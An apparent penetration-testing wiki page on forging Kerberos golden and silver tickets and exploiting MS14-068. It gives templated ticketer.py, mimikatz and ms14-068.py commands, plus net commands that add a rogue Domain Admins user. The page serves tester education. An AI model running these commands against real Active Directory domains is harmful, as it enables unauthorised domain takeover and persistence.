---
description: MITRE ATT&CK™ Sub-techniques T1558.001 and T1558.002
---

# Forged tickets

## Theory

Silver and Golden tickets are forged Kerberos tickets that can be used with [pass-the-ticket](ptt.md) to access services in an Active Directory domain.

* **Golden ticket**: The NT hash (when the RC4 etype is not disabled, or any other Kerberos DES or AES key when it is) of the special account `krbtgt` can be used to forge a special TGT (Ticket Granting Ticket) that can later be used with [Pass-the-ticket](ptt.md) to access any resource within the AD domain. In practice, the `krbtgt`'s key is used to encrypt, among other things, the PAC (Privilege Authentication Certificate), a special set of information about the requesting user that the KDC (Key Distribution Center) will copy/paste in the ST the users requests.
* **Silver ticket**: The NT hash (when the RC4 etype is not disabled, or any other Kerberos DES or AES key when it is) of a service account can be used to forge a Service ticket that can later be used with [Pass-the-ticket](ptt.md) to access that service. In practice, the key is used to encrypt, among other things, the PAC (Privilege Authentication Certificate), a special set of information about the requesting user that the target service will decrypt and read to decide if the user can have access.

The **Bronze bit** vulnerability (CVE-2020-17049) introduced the possibility of forwarding service tickets when it shouldn't normally be possible (protected users, unconstrained delegation, constrained delegation configured with protocol transition).

![](../../../.gitbook/assets/Kerberos\_delegation.png)

## Practice

The following parts allow to obtain modified or crafted Kerberos tickets. Once obtained, these tickets can be used with [Pass-the-Ticket](ptt.md).

{% hint style="success" %}
For Golden and Silver tickets, it's important to remember that, by default, [ticketer](https://github.com/SecureAuthCorp/impacket/blob/a16198c3312d8cfe25b329907b16463ea3143519/examples/ticketer.py#L740-L741) and [mimikatz](https://github.com/gentilkiwi/mimikatz/wiki/module-\~-kerberos) forge tickets containing PACs that say the user belongs to some well-known administrators groups (i.e. group ids 513, 512, 520, 518, 519). There are scenarios where these groups are not enough (special machines where even Domain Admins don't have local admin rights).&#x20;

In these situations, testers can specify all the groups ids when creating the ticket. However, deny ACEs could actually prevent this from working. Encountering a Deny ACE preventing domain admins to log on could be an issue when having all groups ids in the ticket, including the domain admin group id. This solution can also be reall inconvenient in domains that have lots of groups.&#x20;

Another solution to this is to look for a specific user with appropriate rights to impersonate and use [GoldenCopy](https://github.com/Dramelac/GoldenCopy) to generate a command that allows to forge a ticket with specific values corresponding to the target user (sid, group ids, etc.). The values are gathered from a neo4j database.
{% endhint %}

![Using GoldenCopy for specific user impersonation](<../../../.gitbook/assets/image (6).png>)

{% hint style="info" %}
When forging tickets, before November 2021 updates, the user-id and groups-ids were useful but the username supplied was mostly useless. As of Nov. 2021 updates, if the username supplied doesn't exist in Active Directory, the ticket gets rejected. This also applies to Silver Tickets.
{% endhint %}

### Golden ticket

In order to craft a golden ticket, testers need to find the `krbtgt`'s RC4 key (i.e. NT hash) or AES key (128 or 256 bits). In most cases, this can only be achieved with domain admin privileges through a [DCSync attack](../credentials/dumping/dcsync.md). Because of this, golden tickets only allow lateral movement and not privilege escalation.

{% hint style="info" %}
Microsoft now uses AES 256 bits by default. Using this encryption algorithm (instead of giving the NThash) will be stealthier.
{% endhint %}

{% tabs %}
{% tab title="UNIX-like" %}
There are [Impacket](https://github.com/SecureAuthCorp/impacket) scripts for each step of a golden ticket creation : retrieving the `krbtgt`, retrieving the domain SID, creating the golden ticket.

```bash
# Find the domain SID
lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0

# Create the golden ticket (with an RC4 key, i.e. NT hash)
ticketer.py -nthash $krbtgtNThash -domain-sid $domainSID -domain $DOMAIN randomuser

# Create the golden ticket (with an AES 128/256bits key)
ticketer.py -aesKey $krbtgtAESkey -domain-sid $domainSID -domain $DOMAIN randomuser

# Create the golden ticket (with an RC4 key, i.e. NT hash) with custom user/groups ids
ticketer.py -nthash $krbtgtNThash -domain-sid $domainSID -domain $DOMAIN -user-id $USERID -groups $GROUPID1,$GROUPID2,... randomuser
```
{% endtab %}

{% tab title="Windows" %}
On Windows, [mimikatz](https://github.com/gentilkiwi/mimikatz) (C) can be used for this attack.

```bash
# with an NT hash
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:randomuser /ptt

# with an AES 128 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$krbtgt_aes128_key /user:randomuser /ptt

# with an AES 256 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$krbtgt_aes256_key /user:randomuser /ptt
```

For both mimikatz and Rubeus, the `/ptt` flag is used to automatically [inject the ticket](ptt.md#injecting-the-ticket).
{% endtab %}
{% endtabs %}

### Silver ticket

In order to craft a silver ticket, testers need to find the target service account's RC4 key (i.e. NT hash) or AES key (128 or 256 bits). This can be done by [capture an NTLM response](../ntlm/capture.md) (preferably NTLMv1) and [cracking](../credentials/cracking.md) it, by [dumping LSA secrets](../credentials/dumping/sam-and-lsa-secrets.md), by doing a [DCSync](../credentials/dumping/dcsync.md), etc.

_"While the scope is more limited than Golden Tickets, the required hash is easier to get and there is no communication with a DC when using them, so detection is more difficult than Golden Tickets." (_[_adsecurity.org_](https://adsecurity.org/?p=2011)_)_

{% tabs %}
{% tab title="UNIX-like" %}
The [Impacket](https://github.com/SecureAuthCorp/impacket) script [ticketer](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) can create silver tickets.

```bash
# Find the domain SID
lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0

# with an NT hash
python ticketer.py -nthash $NThash -domain-sid $DomainSID -domain $DOMAIN -spn $SPN $Username

# with an AES (128 or 256 bits) key
python ticketer.py -aesKey $AESkey -domain-sid $DomainSID -domain $DOMAIN -spn $SPN $Username
```

The SPN (ServicePrincipalName) set will have an impact on what services will be reachable. For instance, `cifs/target.domain` or `host/target.domain` will allow most remote dumping operations (more info on [adsecurity.org](https://adsecurity.org/?page\_id=183)).
{% endtab %}

{% tab title="Windows" %}
On Windows, [mimikatz](https://github.com/gentilkiwi/mimikatz) can be used to generate a silver ticket. Testers need to carefully choose the right SPN type (cifs, http, ldap, host, rpcss) depending on the wanted usage.

```bash
# with an NT hash
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt

# with an AES 128 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$krbtgt_aes128_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt

# with an AES 256 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$krbtgt_aes256_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt
```

For both mimikatz and Rubeus, the `/ptt` flag is used to automatically [inject the ticket](ptt.md#injecting-the-ticket).
{% endtab %}
{% endtabs %}

{% hint style="info" %}
A great, stealthier, alternative is to [abuse S4U2self](delegations/s4u2self-abuse.md) in order to impersonate a domain user with local admin privileges on the target machine by relying on Kerberos delegation.
{% endhint %}

### MS14-068 (CVE-2014-6324)

This vulnerability allows attackers to forge a TGT with unlimited power (i.e. with a modified PAC stating the user is a member of privileged groups). This attack is similar to the [golden ticket](forged-tickets.md#golden-ticket), however, it doesn't require the attacker to know the `krbtgt`. This attack is a really powerful privilege escalation technique. However, it will not work on patched domain controllers.

{% tabs %}
{% tab title="pykek" %}
This attack can be operated with [pykek](https://github.com/mubix/pykek)'s [ms14-068](https://github.com/mubix/pykek/blob/master/ms14-068.py) Python script. The script can carry out the attack with a cleartext password or with [pass-the-hash](../ntlm/pth.md).

Referring to [kekeo](https://github.com/gentilkiwi/kekeo/wiki/ms14068)'s wiki might also help untangle some situations but errors like  `KDC_ERR_SUMTYPE_NOSUPP (15)` or `KRB_ERR_GENERIC (60)` when trying to use the generated `.ccache` ticket mean the target is patched.

In order to operate the attack, knowing a domain account’s name, it’s password and it’s SID are needed.&#x20;

A TGT can then be obtained with one of the following commands.

```bash
# with a plaintext password
ms14-068.py -u 'USER'@'DOMAIN_FQDN' -p 'PASSWORD' -s 'USER_SID' -d 'DOMAIN_CONTROLLER'

# with pass-the-hash
ms14-068.py -u 'USER'@'DOMAIN_FQDN' --rc4 'NThash' -s 'USER_SID' -d 'DOMAIN_CONTROLLER'
```

Once the `.ccache` TGT is obtained, if the attack is successful, the ticket will be usable with [pass-the-ticket](ptt.md). An easy way to check if the TGT works is to use it and ask for a service ticket. This can be done with Impacket's [getST.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py) (Python).

```bash
getST.py -k -no-pass -spn 'any_valid_spn' $DOMAIN_FQDN/$USER
```

{% hint style="warning" %}
In some scenarios, I personally have had trouble using the `.ccache` ticket on UNIX-like systems. What I did was [convert it](ptt.md#practice) to `.kirbi`, switch to a Windows system, inject the ticket with mimikatz's `kerberos:ptt` command, and then create a new user and add it to the domain admins group.

```bash
net user "hacker" "132Pentest!!!" /domain /add
net group "Domain Admins" /domain /add
```
{% endhint %}

Metasploit Framework can also be useful in the sense that it prints valuable error information.

```bash
msf6 > use admin/kerberos/ms14_068_kerberos_checksum
```
{% endtab %}

{% tab title="🛠️ Windows" %}
kekeo
{% endtab %}
{% endtabs %}

## References

{% embed url="https://en.hackndo.com/kerberos-silver-golden-tickets/" %}

{% embed url="https://adsecurity.org/?p=2011" %}

{% embed url="https://adsecurity.org/?p=483" %}

{% embed url="https://en.hackndo.com/kerberos" %}

{% embed url="https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-overview/" %}

{% embed url="https://labs.f-secure.com/archive/digging-into-ms14-068-exploitation-and-defence/" %}

{% embed url="https://github.com/Dramelac/GoldenCopy" %}
